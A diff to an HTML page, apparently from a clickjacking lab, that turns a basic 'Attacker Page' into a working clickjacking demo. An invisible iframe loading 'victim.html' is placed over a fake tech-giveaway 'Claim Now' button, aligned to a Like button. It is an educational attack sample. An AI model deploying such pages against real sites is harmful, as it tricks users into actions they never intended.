@@ -2,20 +2,95 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="stylesheet" href="style.css" />
-    <script src="script.js" defer></script>
-    <title>Attacker Page</title>
+    <title>MyTechGiveaway</title>
+    <style>
+      body {
+        overflow: hidden;
+        margin: 0;
+      }
+
+      .frame-wrapper {
+        position: relative;
+        width: 100%;
+        height: 100vh;
+        overflow: hidden;
+      }
+
+      iframe {
+        position: absolute;
+        top: -120px;
+        left: 250px;
+        width: 1200px;
+        height: 100%;
+        border: none;
+        opacity: 0;
+        pointer-events: auto; /* Allow interaction when needed */
+        z-index: 3;
+      }
+
+      .clickbait-content {
+        opacity: 1;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: white;
+        border-radius: 12px;
+        padding: 40px;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        z-index: 2;
+        text-align: center;
+      }
+
+      .clickbait-content h1 {
+        color: #007bff;
+        margin-bottom: 15px;
+      }
+
+      .clickbait-content p {
+        margin-bottom: 25px;
+      }
+
+      .fake-btn {
+        padding: 12px 25px;
+        background-color: #28a745;
+        color: white;
+        font-size: 18px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+      }
+
+      /* Make iframe clickable only on target area */
+      .iframe-overlay {
+        position: absolute;
+        top: 350px; /* Adjust to align with like button */
+        left: 545px;
+        width: 140px;
+        height: 50px;
+        z-index: 1;
+        opacity: 0;
+        background-color: red;
+        pointer-events: auto;
+      }
+    </style>
   </head>
   <body>
-    <div>
-      <h1>Congratulations!</h1>
-      <h3>You have won a lottery to Switzerland.</h3>
-      <img src="../assets/i1.jpg" alt="Load failure" />
-    </div>
-    <div class="center-container">
-      <button id="fake_btn">Click Me</button>
-      <iframe id="attack_frame" src="victim.html"></iframe>
+    <div class="frame-wrapper">
+      <iframe src="victim.html"></iframe>
+
+      <!-- Invisible clickable region over Like button -->
+      <div class="iframe-overlay"></div>
+
+      <!-- Visible Content -->
+      <div class="clickbait-content">
+        <h1>🎉 Congratulations!</h1>
+        <p>
+          You’ve been selected for an exclusive tech giveaway. Click below to
+          claim your free device!
+        </p>
+        <button class="fake-btn">Claim Now</button>
+      </div>
     </div>
   </body>
 </html>
